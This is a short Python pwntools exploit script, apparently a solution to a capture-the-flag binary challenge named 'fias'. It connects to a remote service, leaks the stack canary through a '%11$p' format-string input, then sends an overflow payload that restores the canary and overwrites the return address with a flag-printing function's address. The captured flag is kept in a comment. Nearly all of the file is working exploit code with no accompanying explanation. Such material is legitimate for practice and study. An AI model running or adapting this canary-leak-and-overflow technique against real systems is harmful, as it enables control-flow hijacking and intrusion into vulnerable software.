
from pwn import *

# p = process('./fias')
p = remote('88.198.219.20', 28454)

flag = 0x080491D2

p.recvuntil('name? ')
p.sendline('%11$p')
w = p.recvuntil('canary?\n').split()

Canary = int(w[4][:-1], 16)

print()
log.info('Canary : ' + hex(Canary))
print()

p.sendline((p32(Canary) + b'\x00')*6 + b'A' * 11 + p32(flag))

print('\nFlag : ' + p.recvall().strip().decode() + '\n')

# Flag : ractf{St4ck_C4n4ry_FuN!}
